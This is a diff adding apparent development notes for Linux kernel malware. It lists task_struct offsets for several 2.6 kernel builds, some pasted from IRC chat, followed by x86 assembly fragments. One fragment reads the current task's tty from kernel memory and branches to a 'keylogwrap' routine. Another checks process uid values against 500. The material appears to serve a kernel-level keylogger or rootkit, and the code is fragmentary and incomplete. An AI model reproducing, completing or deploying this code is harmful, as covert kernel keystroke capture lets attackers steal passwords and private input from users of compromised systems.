@@ -1,0 +1,67 @@
+2.6.12
+tstruct: c05eb95c
+tstruct.parent: c05eba00 164
+tstruct.signal: c05ebdb8 1116
+signal: c05ebe4c
+signal.tty: c05ebed0 132
+
+2.6.13.4
+tstruct: c80a395c
+tstruct.parent: c80a3a04 168
+tstruct.signal: c80a3db8 1116
+signal: c80a3e4c 
+signal.tty: c80a3ed0 132
+
+2.6.8-debian
+tstruct: c8b6fa10
+tstruct.gid: c8b6fbf0 480
+tstruct.parent: c8b6faa4 148
+tstruct.signal: c8b6ff2c 1308
+signal: c8b6f9c0 68
+signal.tty: c8b6fa04 
+
+
+2.6.13.3-internet-enabled (grsec)
+12:19 <@andrewg> tstruct: d8ecba44
+12:19 <@andrewg> tstruct.gid: d8ecbbbc
+12:19 <@andrewg> tstruct.comm: d8ecbbe8
+12:19 <@andrewg> tstruct.parent: d8ecbaec
+12:19 <@andrewg> tstruct.signal: d8ecbea0
+12:19 <@andrewg> signal: d8ecb8d4
+12:19 <@andrewg> signal.tty: d8ecb958
+
+
+debian 2.6.12-1-686
+12:19 <mxn> tstruct: cda91944
+12:19 <mxn> tstruct.gid: cda91ab8 372
+12:19 <mxn> tstruct.parent: cda919e8 164
+12:19 <mxn> tstruct.signal: cda91da0 1116
+12:19 <mxn> signal: cda91e44 
+12:19 <mxn> signal.tty: cda91ec8 132
+
+
+
+
+
+
+har tty:
+mov ebx,0xffffe000
+and ebx,esp
+mov ebx,[ebx]
+mov ecx,[ebx+1116]
+mov ecx,[ecx+132]
+cmp ecx,0
+jne keylogwrap
+
+
+pid:
+mov edx,0xffffe000
+and edx,esp
+mov ebx,[edx]
+mov esi,[ebx+152]
+cmp esi,500
+ja jajadasistgut
+mov esi,[ebx+156]
+
+jajadasistgut:
+
